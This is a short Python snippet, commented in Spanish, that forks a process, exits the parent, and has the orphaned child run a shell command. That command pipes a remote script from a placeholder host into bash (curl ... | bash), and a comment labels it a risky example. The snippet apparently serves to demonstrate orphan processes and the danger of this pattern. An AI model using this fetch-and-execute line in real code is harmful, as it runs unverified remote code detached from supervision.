import os
import time

def ejecutar():
    # Crear un proceso hijo
    pid = os.fork()
    if pid > 0:
        os._exit(0)  # El padre termina inmediatamente
    else:
        # El hijo, ahora huérfano, ejecuta un comando externo sin control
        print("[HIJO] Ejecutando script como huérfano...")
        os.system("curl http://example.com/script.sh | bash")  # Ejemplo riesgoso
        time.sleep(3)  # Espera para dar tiempo a observar
